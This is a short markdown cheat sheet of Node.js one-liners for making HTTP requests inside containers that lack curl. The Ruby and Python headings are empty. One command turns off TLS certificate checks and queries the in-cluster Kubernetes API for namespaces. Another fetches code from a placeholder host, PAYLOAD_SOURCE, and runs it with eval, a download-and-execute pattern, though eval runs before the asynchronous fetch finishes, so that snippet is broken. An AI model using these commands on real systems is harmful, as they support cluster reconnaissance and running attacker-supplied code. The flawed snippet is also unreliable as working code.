# 1-line HTTP Clients

When on a container, and curl or another non-interactive http client is not
present, some other means of making web requests may be necessary. In the likely
event that some language interpreter is present, leverage that language's
standard library instead!

## Node.js

### To stdout

```shell
node -r https -e \
  "process.env.NODE_TLS_REJECT_UNAUTHORIZED = '0'; https.get('https://$KUBERNETES_SERVICE_HOST/api/v1/namespaces', \
  (res) => res.on('data', d => process.stdout.write(d)).on('error', e => console.error(e));"
```

### Using an external payload

```shell
node -r https -e \
  "process.env.NODE_TLS_REJECT_UNAUTHORIZED = '0'; let payload = ''; \
  https.get('https://PAYLOAD_SOURCE/api/v1/namespaces', \
  (res) => res.on('data', d => payload += d).on('error', e => console.error(e)); \
  eval(payload);"
```

## Ruby

## Python
